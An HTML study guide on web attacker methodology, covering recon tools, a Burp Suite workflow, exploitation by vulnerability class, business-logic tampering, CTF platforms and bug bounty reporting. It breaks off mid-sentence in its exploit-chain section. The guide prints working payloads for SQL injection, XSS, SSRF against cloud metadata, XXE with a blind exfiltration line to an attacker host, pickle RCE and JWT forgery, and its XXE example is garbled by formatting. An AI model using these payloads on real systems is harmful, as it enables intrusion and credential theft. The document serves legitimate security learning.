@@ -1,0 +1,563 @@
+<!doctype html><html><head><meta charset="utf-8">
+<title>Attacker Methodology — How Real Hackers Find and Exploit Web Vulnerabilities</title><style>
+body{background:#0d1117;color:#e6edf3;font-family:system-ui;max-width:860px;margin:0 auto;padding:64px 24px 40px;line-height:1.65}
+h1{color:#f0b429;border-bottom:2px solid #30363d;padding-bottom:10px}
+h2{color:#58a6ff;margin-top:36px;border-bottom:1px solid #21262d;padding-bottom:6px}
+h3{color:#3fb950}
+a{color:#58a6ff}code{background:#161b22;padding:2px 7px;border-radius:5px;color:#f0b429;font-size:.9em}
+pre{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;overflow-x:auto}
+pre code{background:none;padding:0;color:#e6edf3}
+table{border-collapse:collapse;width:100%;margin:16px 0}
+th,td{border:1px solid #30363d;padding:8px 12px;text-align:left}
+th{background:#161b22;color:#f0b429}
+blockquote{border-left:3px solid #f0b429;margin:16px 0;padding:8px 20px;background:#161b22;color:#8b949e}
+li{margin:5px 0}
+a.doc{display:block;background:#161b22;border:1px solid #30363d;border-radius:10px;padding:14px 18px;margin:10px 0;color:#58a6ff;text-decoration:none}a.doc:hover{border-color:#f0b429}small{color:#8b949e}
+.pnav{position:fixed;top:0;left:0;right:0;background:#0d1117ee;border-bottom:1px solid #30363d;backdrop-filter:blur(8px);z-index:99;display:flex;align-items:center;gap:14px;padding:10px 24px;font-family:ui-monospace,Consolas,monospace;font-size:13px}
+.pnav .plogo{color:#f0b429;font-weight:700;text-decoration:none;letter-spacing:1px}
+.pnav .pdigits{color:#8b949e;letter-spacing:2px}
+.pnav a.nl{color:#58a6ff;text-decoration:none;margin-left:auto}
+.pnav a.nl:hover{color:#f0b429}
+p.footer,footer{margin-top:48px;padding-top:16px;border-top:1px solid #21262d;color:#8b949e;font-size:12px;font-family:ui-monospace,Consolas,monospace;text-align:center}
+p.footer a,footer a{color:#58a6ff;text-decoration:none}
+.pill{display:inline-block;border-radius:999px;padding:2px 10px;font:11px ui-monospace,Consolas,monospace}
+.pill-ok{background:#3fb95022;color:#3fb950;border:1px solid #3fb95055}
+.pill-run{background:#f0b42922;color:#f0b429;border:1px solid #f0b42955}
+.pill-bad{background:#f8514922;color:#f85149;border:1px solid #f8514955}
+</style></head><body>
+<nav class="pnav"><a class="plogo" href="01 - the-project-individual.html">⬡ PRIME</a><span class="pdigits">1·3·7·9</span><a class="nl" href="00 - PRIME INDEX.html">INDEX ⌕</a></nav><h1 id="attacker-methodology-how-real-hackers-find-and-exploit-web-vulnerabilities">Attacker Methodology — How Real Hackers Find and Exploit Web Vulnerabilities</h1>
+<p>Companion to <code>learning_path.md</code> (resources) and <code>payment_bypass.md</code> (vuln classes).
+This document is about <strong>how to think and work like an attacker</strong>: recon → analysis →
+exploitation → chaining, with the tools each stage uses.</p>
+<hr />
+<h2 id="1-reconnaissance-what-attackers-enumerate-first">1. Reconnaissance — what attackers enumerate first</h2>
+<p>Recon (reconnaissance) is 80% of the job. Before touching a vulnerability, attackers
+build a map of the target. The goal is to answer four questions:</p>
+<ol>
+<li><strong>What is this application?</strong> — tech stack, frameworks, languages, versions.</li>
+<li><strong>What does it expose?</strong> — endpoints, params, files, users, data.</li>
+<li><strong>How does it talk?</strong> — API structure, auth model, tokens.</li>
+<li><strong>What history does it have?</strong> — deleted endpoints, old versions, leaked secrets.</li>
+</ol>
+<h3 id="11-tech-stack-fingerprinting">1.1 Tech stack fingerprinting</h3>
+<ul>
+<li><strong>Wappalyzer</strong> (browser extension) and <strong>BuiltWith</strong> fingerprint the site:
+  CMS (WordPress, Drupal), web servers (nginx, Apache, IIS), JS frameworks
+  (React, Angular), analytics, CDNs, and — importantly — <strong>outdated versions</strong>.</li>
+<li><code>whatweb</code> / <code>wappalyzercli</code> automate this from the CLI.</li>
+<li>Why it matters: a version number maps to known CVEs and known default exploits.
+  "WordPress 5.8 + Contact Form 7" is not a target, it's a checklist.</li>
+<li>Check <code>Server</code>, <code>X-Powered-By</code>, and <code>Set-Cookie</code> headers in Burp too — they
+  leak technology even when the UI doesn't.</li>
+</ul>
+<h3 id="12-directory-and-file-brute-forcing">1.2 Directory and file brute-forcing</h3>
+<ul>
+<li><strong>ffuf</strong> (fast fuzzer), <strong>gobuster</strong>, <strong>feroxbuster</strong> hammer the server with
+  guesses from wordlists (SecLists: <code>common.txt</code>, <code>raft-small-words.txt</code>).</li>
+<li>Typical targets: <code>/admin</code>, <code>/api</code>, <code>/backup</code>, <code>/.git/</code>, <code>/config</code>, <code>/uploads</code>,
+  <code>/swagger</code>, <code>/.env</code>, <code>/phpmyadmin</code>, <code>/server-status</code>.</li>
+<li>Extensions matter: try <code>.php</code>, <code>.bak</code>, <code>.old</code>, <code>.swp</code>, <code>.zip</code> — backups and
+  source files leak credentials and source code.</li>
+<li><code>.git</code> exposure is a classic: <code>git-dumper</code> or <code>gitsploit</code> reconstructs the
+  whole source tree from an exposed <code>.git</code> directory.</li>
+</ul>
+<h3 id="13-subdomain-enumeration">1.3 Subdomain enumeration</h3>
+<ul>
+<li>Attacker surface expands: <code>staging.</code>, <code>dev.</code>, <code>api.</code>, <code>admin.</code>, <code>test.</code> subdomains
+  often run older/weaker versions.</li>
+<li>Tools: <strong>subfinder</strong>, <strong>amass</strong>, <strong>assetfinder</strong>, <strong>crt.sh</strong> (certificate
+  transparency logs — every cert ever issued for the domain), <strong>dnsx</strong>, <strong>puredns</strong>.</li>
+<li>For labs: just check <code>/etc/hosts</code>-style manual guessing plus brute force.</li>
+</ul>
+<h3 id="14-robotstxt-sitemapxml-and-well-known-files">1.4 robots.txt, sitemap.xml, and well-known files</h3>
+<ul>
+<li><code>robots.txt</code> literally lists paths the site doesn't want crawled — often the
+  exact admin and backup paths attackers want.</li>
+<li><code>sitemap.xml</code> enumerates every public page (and occasionally private ones).</li>
+<li><code>/security.txt</code>, <code>/.well-known/</code>, <code>/humans.txt</code> leak info too.</li>
+</ul>
+<h3 id="15-javascript-analysis-the-biggest-beginner-superpower">1.5 JavaScript analysis — the biggest beginner superpower</h3>
+<ul>
+<li>Modern SPAs put <strong>everything in the frontend</strong>: API endpoints, parameter names,
+  feature flags, and sometimes <strong>hardcoded API keys, tokens, and internal URLs</strong>.</li>
+<li>Technique: open DevTools → Sources (or download all JS via DevTools → "Save all
+  as HAR"), then grep for <code>api</code>, <code>key</code>, <code>token</code>, <code>secret</code>, <code>password</code>, <code>http</code>.</li>
+<li>Tools: <strong>LinkFinder</strong>, <strong>JSFinder</strong>, <strong>subjs</strong>, <strong>waybackurls</strong> for historical JS.</li>
+<li>In Burp: use the "Find comments" / grep on saved responses, or extensions like
+  "JS Link Finder". Every endpoint discovered in JS is a request to replay in
+  Burp Repeater.</li>
+<li>Buried source maps (<code>.map</code> files) can reconstruct original source code.</li>
+</ul>
+<h3 id="16-wayback-machine-and-historical-data">1.6 Wayback Machine and historical data</h3>
+<ul>
+<li><code>web.archive.org</code> keeps snapshots of the site over years — old JS files,
+  deleted endpoints, old login pages that no longer exist.</li>
+<li>Tools: <strong>waybackurls</strong> (all URLs ever seen), <strong>gau</strong> (Google + Wayback archive),
+  <strong>waymore</strong>. Query <code>web.archive.org/cdx/search/cdx?url=target.com/*</code>.</li>
+<li>Old endpoints are prime IDOR/broken-auth territory — the feature may be gone
+  from the UI but still live on the server.</li>
+</ul>
+<h3 id="17-the-recon-output-attackers-keep">1.7 The recon output attackers keep</h3>
+<p>A working notes file with: tech versions, endpoint list, params per endpoint,
+auth mechanism, interesting files, and a prioritized "test here" list. This is the
+"attack surface map" that everything else runs on.</p>
+<hr />
+<h2 id="2-the-hacker-mindset">2. The hacker mindset</h2>
+<p>Attackers don't "try random things" — they run a loop:</p>
+<h3 id="21-core-beliefs">2.1 Core beliefs</h3>
+<ul>
+<li><strong>"Every input is evil."</strong> Every field, header, cookie, URL param, and file
+  upload is attacker-controlled until proven otherwise.</li>
+<li><strong>"Trust boundaries are lies."</strong> The frontend "locks" things but the server is
+  the only authority. Hidden fields, disabled buttons, and client-side validation
+  are <em>suggestions</em>, not security.</li>
+<li><strong>"The client can lie."</strong> Any value sent to the server can be modified — and will be.</li>
+<li><strong>"What does the server do with it?"</strong> The question isn't "what does the UI
+  allow?" but "what does the code do when it receives X?"</li>
+</ul>
+<h3 id="22-attacker-checklist-per-feature">2.2 Attacker checklist per feature</h3>
+<p>For every endpoint discovered:</p>
+<ol>
+<li>What inputs does it accept? (params, body, headers, cookies)</li>
+<li>Which inputs affect control flow or data access? (IDs, roles, prices)</li>
+<li>What happens with: missing values, wrong types, huge values, negative numbers,
+   SQL/XSS payloads, other users' IDs?</li>
+<li>Does auth actually enforce what the UI implies? (try without login, with a
+   low-priv user, with a tampered session)</li>
+<li>Can I replay, reorder, or skip steps? (race the checkout, reuse a coupon twice)</li>
+<li>Where does this data go next? (stored? rendered? emailed? logged?)</li>
+<li>Is there a second-order effect? (payload fires later in admin panel = stored XSS)</li>
+</ol>
+<h3 id="23-the-assume-breach-habit">2.3 The "assume breach" habit</h3>
+<p>Attackers assume some input somewhere is mishandled, then hunt for <em>which</em> one.
+Manual testing beats scanning because scanners only know known-bad patterns —
+the business-logic and chaining bugs that pay real money require a human brain
+walking the app like a user who is also a liar.</p>
+<hr />
+<h2 id="3-burp-suite-workflow-deep-dive">3. Burp Suite workflow deep-dive</h2>
+<p>Burp is the attacker's browser. Everything goes through its proxy.</p>
+<h3 id="31-setup">3.1 Setup</h3>
+<ul>
+<li>Proxy → Options → listener on <code>127.0.0.1:8080</code>; point browser/Foxproxy at it.</li>
+<li>Install CA cert (http://burp → "CA Certificate") so HTTPS intercept works.</li>
+<li>Scope the target (Target → Scope) so you don't accidentally attack other sites.</li>
+</ul>
+<h3 id="32-the-core-loop">3.2 The core loop</h3>
+<ol>
+<li><strong>Browse normally</strong> through Burp proxy — every request lands in <strong>Proxy → HTTP
+   history</strong> and <strong>Logger</strong>.</li>
+<li><strong>Identify interesting requests</strong> — anything touching auth, IDs, prices,
+   file uploads, admin functions, search, comments.</li>
+<li><strong>Send to Repeater</strong> (right-click → Send to Repeater) — your manual exploit
+   workbench. Edit any part of the request: method, path, headers, cookies, body.</li>
+<li><strong>Modify → Send → Read response</strong> — this is the fundamental exploit loop:
+   change one thing, observe the difference. Diff responses to confirm impact.</li>
+</ol>
+<h3 id="33-burp-tabs-explained">3.3 Burp tabs explained</h3>
+<ul>
+<li><strong>Proxy → Intercept</strong>: pause and edit requests <em>in flight</em>. Use to toggle
+  values before they even hit the server (e.g., change <code>user=alice</code> to <code>admin</code>
+  on a request you didn't want to craft from scratch).</li>
+<li><strong>Repeater</strong>: the main tool. Send arbitrary modified requests, compare
+  responses, build multi-step attacks (e.g., get a token, then use it).</li>
+<li><strong>Intruder</strong>: automated fuzzing of positions in a request. Payload sets +
+  attack types (Sniper for one position, Battering ram for same payload in
+  multiple, Pitchfork/Cluster bomb for combos). Used for brute force, parameter
+  fuzzing, ID enumeration.</li>
+<li><strong>Comparer</strong>: diff two responses/requests byte-by-byte — proves whether your
+  tampering changed anything (e.g., <code>isAdmin: false</code> → <code>true</code>).</li>
+<li><strong>Logger</strong>: passive log of every request/response — search it later, find
+  params you missed while browsing.</li>
+<li><strong>Target → Site map</strong>: auto-built tree of everything you've touched; filter
+  by MIME type to find JSON/API endpoints and static files.</li>
+<li><strong>Scanner</strong> (Pro only): automated vuln scanning — finds known patterns, not
+  logic bugs.</li>
+<li><strong>Extensions</strong>: Autorize (auth bypass testing), Turbo Intruder (race
+  conditions), JWT Editor, InQL (GraphQL), Logger++ (better logging).</li>
+</ul>
+<h3 id="34-community-vs-pro">3.4 Community vs Pro</h3>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Community (free)</th>
+<th>Pro (paid)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Proxy, Repeater, Intruder, Comparer</td>
+<td>✅</td>
+<td>✅</td>
+</tr>
+<tr>
+<td>Burp Scanner (automated)</td>
+<td>❌</td>
+<td>✅ (DAST engine)</td>
+</tr>
+<tr>
+<td>Project files/saving sessions</td>
+<td>❌ (per-project limit)</td>
+<td>✅ unlimited</td>
+</tr>
+<tr>
+<td>CI integration, active scan API</td>
+<td>❌</td>
+<td>✅</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Verdict</strong>: learn on Community — it's fully sufficient for manual methodology.
+Pro's scanner is nice for breadth but generates noise and misses logic bugs.</p>
+<hr />
+<h2 id="4-owasp-zap-the-automated-alternative">4. OWASP ZAP — the automated alternative</h2>
+<ul>
+<li><strong>OWASP ZAP</strong> (Zed Attack Proxy) is the free/open-source Burp equivalent, with
+  a stronger <strong>automated scanner</strong> built in.</li>
+<li>Workflow: spider (traditional or AJAX spider) → passive scan → <strong>active scan</strong>
+  (injects real payloads, actually exploits).</li>
+<li>Strengths: free, scriptable (zaproxy API / Automation Framework), CI-friendly,
+  good baseline coverage of OWASP Top 10.</li>
+<li>Weaknesses vs Burp: clunkier manual workflow, noisier active scans, weaker
+  extensions ecosystem.</li>
+<li><strong>When to use which</strong>: ZAP for quick automated sweeps and regression
+  scanning of your own apps in CI; Burp for the actual exploit development
+  and manual hunting. Many testers run both: ZAP maps, Burp exploits.</li>
+</ul>
+<hr />
+<h2 id="5-exploitation-fundamentals-per-vulnerability-class">5. Exploitation fundamentals per vulnerability class</h2>
+<h3 id="51-sql-injection-how-payloads-actually-work">5.1 SQL Injection — how payloads actually work</h3>
+<p>The DB parses your input as SQL. Goal: break out of the string context and
+append commands.</p>
+<ul>
+<li><strong>Detection</strong>: <code>'</code> (single quote) → look for 500 errors or weird behavior.
+  Then <code>' OR '1'='1</code> style tautologies, or <code>1' AND '1'='2</code> vs <code>'1'='1</code> to
+  confirm boolean influence.</li>
+<li><strong>Union-based</strong> (data extraction): <code>UNION SELECT username,password FROM users--</code>
+  — requires matching column count (enumerate with <code>ORDER BY n</code> until error)
+  and compatible types. <code>--</code> comments out the rest of the query.</li>
+<li><strong>Blind boolean</strong>: no data in response, but behavior differs. Ask true/false
+  questions: <code>' AND SUBSTRING(password,1,1)='a</code> — extract char-by-char. Slow
+  but universal.</li>
+<li><strong>Time-based blind</strong>: <code>' AND SLEEP(5)--</code> — if response takes 5s, condition true.
+  Use <code>BENCHMARK</code>/<code>pg_sleep</code> depending on DB. This is how you extract data when
+  nothing is ever displayed.</li>
+<li><strong>Error-based</strong>: force DB errors that leak data: <code>AND extractvalue(1,concat(0x7e,(SELECT version())))</code>.</li>
+<li><strong>Out-of-band</strong>: make DB send DNS/HTTP to your server (<code>LOAD_FILE</code>, <code>xp_dirtree</code>)
+  for blind exfiltration on hardened targets.</li>
+<li>Always fingerprint the DB first: error messages, <code>@@version</code>, <code>sqlite_master</code>,
+  <code>information_schema</code>, <code>pg_tables</code> — syntax differs per engine.</li>
+</ul>
+<h3 id="52-xss-three-types">5.2 XSS — three types</h3>
+<ul>
+<li><strong>Reflected</strong>: payload in URL/param echoed in response.
+  <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> → test context first: in HTML body? in an
+  attribute? inside JS string? inside a URL? Payload must break out of that
+  context (<code>"&gt;&lt;script&gt;</code>, <code>'-alert(1)-'</code>, <code>javascript:</code> URIs).</li>
+<li><strong>Stored</strong>: payload saved server-side (comments, usernames, bios) and fired
+  for every viewer — including admins. Highest impact; aim here.</li>
+<li><strong>DOM-based</strong>: payload never touches the server — JS on the page reads it
+  (e.g., <code>location.hash</code>) and sinks it into <code>innerHTML</code>/<code>eval</code>/<code>document.write</code>.
+  Test by putting payloads in URL fragments and watching with DOM Invader
+  (Burp Pro) or DevTools.</li>
+<li>Escalation: <code>alert(1)</code> proves XSS; real exploit steals <code>document.cookie</code>
+  or performs actions as the victim (<code>fetch('/transfer',...)</code>).</li>
+</ul>
+<h3 id="53-csrf-token-bypass-techniques">5.3 CSRF token bypass techniques</h3>
+<ul>
+<li>Remove the token entirely; reuse an old token; use another session's token.</li>
+<li>If token is tied to session but not validated per-request, try <strong>token
+  fixation</strong> or swapping tokens between accounts.</li>
+<li>Check if token is only validated when present — omit it and see.</li>
+<li>Try alternate content types (<code>text/plain</code>, <code>application/json</code> may skip the
+  CSRF middleware) and GET requests for state changes.</li>
+<li>Referer/Origin checks can often be bypassed by omitting headers (older
+  browsers/clients) or via subdomain XSS.</li>
+<li>SameSite=Lax/None cookie attributes decide whether the browser even sends
+  cookies cross-site — check them first.</li>
+</ul>
+<h3 id="54-ssrf-server-side-request-forgery">5.4 SSRF — Server-Side Request Forgery</h3>
+<ul>
+<li>Any feature that makes the server fetch a URL: webhooks, image import by URL,
+  PDF generators, URL preview/unfurl, "check this feed".</li>
+<li>Payloads: <code>http://127.0.0.1:8080/admin</code>, <code>http://169.254.169.254/latest/meta-data/</code>
+  (AWS metadata — steals IAM creds), <code>http://localhost:6379</code> (Redis), internal
+  hostnames (<code>http://intranet/</code>), DNS rebinding.</li>
+<li>Bypass filters with: decimal/octal IP (<code>2130706433</code>), IPv6 <code>[::1]</code>, URL-encoding,
+  <code>http://evil.com@127.0.0.1</code>, redirects (<code>http://yourserver/redirect</code>), <code>file://</code>,
+  <code>gopher://</code> for raw TCP.</li>
+<li>Cloud metadata endpoints are the crown jewel: IMDSv1 gives creds with no auth.</li>
+</ul>
+<h3 id="55-xxe-xml-external-entities">5.5 XXE — XML External Entities</h3>
+<ul>
+<li>Any XML parser accepting external entities lets you read local files or hit
+  internal services.</li>
+<li>Payload:
+  ```xml
+  <?xml version="1.0"?></li>
+</ul>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">
+<p>]&gt;
+  <root>&xxe;</root>
+  <code>``
+- Blind XXE: exfiltrate via external DTD you host:</code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;&lt;!ENTITY % eval "&lt;!ENTITY exfil SYSTEM 'http://you/?x=%file;'&gt;"&gt;%eval;<code>- Check SVG uploads, SOAP APIs, SAML, docx/xlsx parsers — anywhere XML is consumed.
+- Even "JSON-only" APIs sometimes parse XML if</code>Content-Type` is switched.</p>
+<h3 id="56-insecure-deserialization">5.6 Insecure deserialization</h3>
+<ul>
+<li>App serializes objects (Java <code>readObject</code>, PHP <code>unserialize</code>, Python pickle,
+  .NET <code>ViewState</code>, Node <code>node-serialize</code>) and attacker controls the blob.</li>
+<li>Detection: look for base64 blobs in cookies/params (<code>rO0AB...</code> = Java,
+  <code>O:8:"..."</code> = PHP, pickle opcodes). Flip bytes and watch errors.</li>
+<li>Java: ysoserial gadget chains (CommonsCollections etc.) → RCE.</li>
+<li>PHP: POP chains via magic methods (<code>__wakeup</code>, <code>__destruct</code>).</li>
+<li>Python pickle: <code>cos\nsystem\n(S'id'\ntR.</code> style payloads → RCE.</li>
+<li>.NET ViewState: if <code>__VIEWSTATE</code> isn't MAC-validated, forge it
+  (<code>ysoserial.net</code>); if MAC'd but key is weak/default, crack it.</li>
+</ul>
+<h3 id="57-jwt-attacks">5.7 JWT attacks</h3>
+<p>JWT = header.payload.signature (base64url). Attack surface:</p>
+<ul>
+<li><strong><code>alg: none</code></strong>: change <code>{"alg":"HS256"}</code> to <code>{"alg":"none"}</code>, strip signature,
+  send <code>header.payload.</code> — many libs accept unsigned tokens. Also try
+  <code>None</code>, <code>nOnE</code> case variants.</li>
+<li><strong>Algorithm confusion</strong>: RS256→HS256 — use the server's <em>public key</em> as the
+  HMAC secret and re-sign with it. Get the public key from <code>/jwks.json</code> or JWKS endpoint.</li>
+<li><strong>Weak secret</strong>: HS256 = HMAC with a passphrase. Crack offline with
+  <strong>hashcat</strong> (<code>-m 16500</code>) or <strong>jwt_tool</strong> wordlists — "secret", "123456",
+  company name. Then forge any claims (<code>role: admin</code>, <code>sub: victim</code>).</li>
+<li><strong><code>kid</code> (key ID) injection</strong>: header <code>kid</code> may point to a file/key. Try
+  <code>kid: ../../dev/null</code> (empty key), SQL injection in kid lookup,
+  <code>kid: /proc/self/environ</code>, or point it at a file you control.</li>
+<li><strong><code>jku</code>/<code>x5u</code> header injection</strong>: server fetches keys from a URL you supply →
+  host your own JWKS → sign with your own key.</li>
+<li><strong>Claim tampering</strong>: even with valid signature, check if claims like <code>role</code>,
+  <code>isAdmin</code>, <code>exp</code> are trusted blindly (test by re-signing after secret crack).</li>
+<li><strong><code>exp</code> handling</strong>: expired tokens accepted? <code>exp: 9999999999</code>?</li>
+<li>Tool: <strong>jwt_tool</strong> (<code>python jwt_tool.py &lt;token&gt; -C -d</code> crack, <code>-T</code> tamper).</li>
+</ul>
+<hr />
+<h2 id="6-business-logic-hunting-the-manual-thinking-process">6. Business logic hunting — the manual thinking process</h2>
+<p>This is where beginner scanners fail and real money lives. No tool finds
+"negative quantity" or "coupon reuse" — you walk the flow like a suspicious user.</p>
+<h3 id="61-the-methodology">6.1 The methodology</h3>
+<ol>
+<li><strong>Map the flow completely in Burp</strong>: buy a cheap item end-to-end, save every
+   request (they're all in Logger/history). Note: cart → coupon → checkout →
+   payment → confirmation.</li>
+<li><strong>List every parameter</strong> in those requests: <code>price</code>, <code>quantity</code>, <code>coupon</code>,
+   <code>product_id</code>, <code>user_id</code>, <code>total</code>, <code>discount</code>, <code>currency</code>, hidden fields.</li>
+<li><strong>Question each one</strong>: "Does the server trust this value, or recompute it?"
+   Test by changing it and checking the <em>final</em> result (order total, confirmation page, email).</li>
+</ol>
+<h3 id="62-classic-manipulations">6.2 Classic manipulations</h3>
+<ul>
+<li><strong>Negative values</strong>: <code>quantity=-1</code> or <code>price=-100</code> — refunds/credits you money.</li>
+<li><strong>Zero/overflow</strong>: <code>quantity=0</code>, huge numbers, <code>quantity=1e10</code>, integer
+  overflow (<code>2147483647+1</code>), float tricks (<code>0.001</code>, NaN).</li>
+<li><strong>Price tampering</strong>: change <code>price=9.99</code> → <code>price=0.01</code> in the request —
+  if the server trusts the client-sent price instead of looking it up by
+  <code>product_id</code>, you win. (This is exactly what <code>payment_bypass.md</code> covers.)</li>
+<li><strong>Coupon abuse</strong>: reuse same coupon twice, stack coupons, apply after
+  checkout, race two checkouts with the same coupon.</li>
+<li><strong>Race conditions</strong>: send the same request N times simultaneously —
+  double-spend coupons/balance, transfer more than you have, claim a
+  limited-quantity item twice. Tool: <strong>Turbo Intruder</strong> (Burp extension) with
+  <code>single-packet attack</code> — sends all requests in one TCP packet so they hit
+  the server truly concurrently. Burp Community's Intruder is too slow for this.</li>
+<li><strong>Workflow bypass</strong>: skip steps — go straight to <code>/checkout/confirm</code> without
+  payment; change <code>step=3</code> to <code>step=4</code>; replay an old "payment successful"
+  request after a failed one; access order-confirmation URL of someone else.</li>
+<li><strong>Horizontal/vertical escalation</strong>: change <code>user_id</code>, <code>order_id</code>, <code>tenant_id</code>
+  in requests to access other users' data (IDOR — see vuln classes).</li>
+<li><strong>Currency/rounding</strong>: <code>price=0.001</code> rounds down; different currency with
+  favorable rounding; negative discount exceeding price.</li>
+<li><strong>File upload logic</strong>: allowed extensions vs. allowed content types vs.
+  filename checks — polyglot files (GIF+PHP), double extensions, <code>.htaccess</code>
+  upload, path traversal in filename.</li>
+</ul>
+<h3 id="63-the-mindset">6.3 The mindset</h3>
+<p>"If the developer computed X on the server, tampering fails. If the client sent
+X and the server used it, tampering wins." Your job is to find which values
+the server <em>recomputes</em> vs <em>trusts</em>.</p>
+<hr />
+<h2 id="7-ctf-platforms-for-practice">7. CTF platforms for practice</h2>
+<p>Ranked roughly beginner → advanced:</p>
+<table>
+<thead>
+<tr>
+<th>Platform</th>
+<th>Style</th>
+<th>Best for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>PortSwigger Web Security Academy</strong></td>
+<td>Free labs per vuln class, Burp-integrated</td>
+<td><strong>#1 for beginners</strong> — teaches Burp + each vuln class properly</td>
+</tr>
+<tr>
+<td><strong>PicoCTF</strong></td>
+<td>Beginner CTF, yearly</td>
+<td>Gentle intro to web + general hacking</td>
+</tr>
+<tr>
+<td><strong>OverTheWire: Bandit → Natas</strong></td>
+<td>Command-line wargames</td>
+<td>Linux + web basics (Natas = web)</td>
+</tr>
+<tr>
+<td><strong>TryHackMe</strong></td>
+<td>Guided rooms with walkthroughs</td>
+<td>Structured learning paths, room "Web Fundamentals"</td>
+</tr>
+<tr>
+<td><strong>HackTheBox</strong></td>
+<td>Realistic boxes, harder</td>
+<td>After TryHackMe — full machines, harder web</td>
+</tr>
+<tr>
+<td><strong>Root-Me</strong></td>
+<td>App challenges categorized by vuln type</td>
+<td>Drill specific classes (XSS, SQLi) repeatedly</td>
+</tr>
+<tr>
+<td><strong>CTFtime / CTFd events</strong></td>
+<td>Team competitions</td>
+<td>Real-world mixed challenges, writeups galore</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Recommended path</strong>: PortSwigger labs for every class → TryHackMe "Web
+Fundamentals" + specific rooms → PicoCTF → HTB starting point/tier 0 → real
+bug bounty.</p>
+<hr />
+<h2 id="8-bug-bounty-methodology">8. Bug bounty methodology</h2>
+<h3 id="81-platforms-payouts">8.1 Platforms &amp; payouts</h3>
+<ul>
+<li><strong>HackerOne</strong> (largest), <strong>Bugcrowd</strong>, <strong>Intigriti</strong> (EU-strong). Also
+  <code>yeswehack</code>, direct <code>security.txt</code> programs, and Google's VRP.</li>
+<li>Payouts vary wildly: low-sev info leaks $50–500; XSS $500–2,500; IDOR data
+  exposure $1,000–10,000; RCE/auth bypass $5,000–50,000+. Top hunters make
+  six figures/year; median earnings are much lower — it's a skill lottery.</li>
+</ul>
+<h3 id="82-the-workflow">8.2 The workflow</h3>
+<ol>
+<li><strong>Read the scope — literally.</strong> In-scope domains/assets, out-of-scope
+   exclusions, safe-harbor terms, payout table. Testing out-of-scope = legal
+   trouble even if you found a real bug.</li>
+<li><strong>Recon</strong>: subfinder/amass → httpx probe → nuclei (known-CVE scan) →
+   gau/waybackurls for endpoints → JS analysis (LinkFinder) → build asset
+   inventory. Tools: <strong>reconftw</strong>, <strong>autorecon</strong>, or manual pipeline.</li>
+<li><strong>Automated baseline</strong>: nuclei + ZAP passive — catches known-CVE low-hanging
+   fruit; use as leads, not findings.</li>
+<li><strong>Manual testing</strong>: pick ONE app/feature at a time. Burp through it.
+   Prioritize: auth flows, user-to-user interactions, file uploads,
+   anything handling money/data. This is 90% of real findings.</li>
+<li><strong>Verify impact</strong>: prove it with minimal demonstration (e.g., read <em>your
+   own</em> second account's data via IDOR — never exfiltrate real user data).</li>
+<li><strong>Write the report</strong> (below).</li>
+<li><strong>Triage → fix → bounty</strong>. Duplicate/NA is normal — don't take it personally.</li>
+</ol>
+<h3 id="83-report-writing-what-separates-paid-from-closed-as-na">8.3 Report writing — what separates paid from closed-as-NA</h3>
+<p>Structure:
+- <strong>Title</strong>: <code>[Asset] Vuln class in feature — impact</code> (e.g., "IDOR in
+  /api/orders/{id} leaks any user's order details").
+- <strong>Severity + CVSS</strong> estimate.
+- <strong>Summary</strong>: 2–3 sentences: what, where, impact.
+- <strong>Steps to reproduce</strong>: numbered, copy-pasteable curl/Burp requests a
+  triager can run verbatim. Include exact payloads.
+- <strong>Impact</strong>: concrete — "attacker reads any user's PII", not "could be bad".
+- <strong>Evidence</strong>: screenshots/screen recording, redacted.
+- <strong>Remediation</strong> (optional but appreciated): how to fix.</p>
+<p>Golden rule: write the report for a tired engineer at 2am who must reproduce
+your finding in 10 minutes. Vague reports = N/A. Precise reports = paid.</p>
+<hr />
+<h2 id="9-common-beginner-mistakes">9. Common beginner mistakes</h2>
+<ol>
+<li><strong>Scanning without permission</strong> — even "just nuclei" against a site you
+   don't own/aren't authorized for is illegal (CFAA etc.). Own labs and
+   written scope only.</li>
+<li><strong>Not reading scope</strong> — out-of-scope assets (e.g., <code>blog.target.com</code>, third
+   parties) invalidate the report and can get you banned.</li>
+<li><strong>Duplicate reports</strong> — check the program's disclosed/hacktivity list
+   before spending hours; low-hanging fruit is picked over.</li>
+<li><strong>Poor report quality</strong> — "I found XSS" with a screenshot of <code>alert(1)</code>
+   and no repro steps = instant N/A or informational.</li>
+<li><strong>Claiming impact you didn't prove</strong> — "could steal all data" without
+   demonstrating = downgraded or rejected. Prove minimum viable impact.</li>
+<li><strong>Excessive testing / DoS</strong> — automated scans at full speed can take
+   programs down; rate-limit yourself, no brute-force at scale unless scope allows.</li>
+<li><strong>Touching real user data</strong> — accessing other users' actual data beyond
+   proof-of-concept can violate program rules (access only what's needed to
+   demonstrate, then stop).</li>
+<li><strong>Not version-controlling notes</strong> — losing your recon notes and request
+   history wastes hours; export Burp Logger, keep a findings file.</li>
+<li><strong>Scanner-only mindset</strong> — running ZAP/Burp scanner and submitting every
+   alert = noise; triage each finding manually, prove exploitability.</li>
+<li><strong>Giving up after first N/A</strong> — normal part of the process; learn why it
+    was rejected (usually impact/scope/repro issues) and iterate.</li>
+</ol>
+<hr />
+<h2 id="10-from-vuln-to-exploit-chain-how-small-bugs-compound">10. From vuln to exploit chain — how small bugs compound</h2>
+<p>Real compromises are chains, not single bugs. The attacker's skill is
+<em>connecting</em> findings.</p>
+<h3 id="101-classic-chains">10.1 Classic chains</h3>
+<ul>
+<li><strong>XSS → session theft → account takeover</strong>: stored XSS in a comment/profile
+  fires when an admin views it → steals admin's <code>session</code> cookie (if not
+  HttpOnly) or performs actions as them → full takeover.</li>
+<li><strong>IDOR → data leak → privesc</strong>: IDOR in <code>/api/user/{id}</code> leaks every user's
+  email → use emails for targeted phishing or find an admin account → combine
+  with weak password reset flow → admin takeover.</li>
+<li><strong>SSRF → cloud creds → infrastructure</strong>: SSRF hits <code>169.254.169.254</code> →
+  steals IAM role credentials → enumerate S3 buckets → find backups/secrets →
+  pivot to internal network.</li>
+<li><strong>Open redirect → OAuth token theft</strong>: open redirect in OAuth <code>redirect_uri</code>
